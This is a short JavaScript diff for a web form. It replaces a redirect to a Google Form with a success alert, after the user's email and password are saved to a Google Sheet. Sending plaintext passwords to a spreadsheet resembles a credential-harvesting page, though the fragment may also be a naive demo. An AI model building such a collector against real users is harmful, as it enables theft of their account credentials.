@@ -134,11 +134,10 @@
                 return;
             }
 
-            // Save to Google Sheets and redirect after success
+            // Save to Google Sheets (No redirection to Google Form)
             saveToGoogleSheet(email, password)
                 .then(() => {
-                    // Redirect to Google Form after data is saved
-                    window.location.href = "https://forms.gle/kmsJ7Zabyc1iMhsu9"; // Replace with your Google Form URL
+                    alert("Data saved successfully!"); // Confirm data save
                 })
                 .catch((error) => {
                     // Handle any errors that occurred during the save
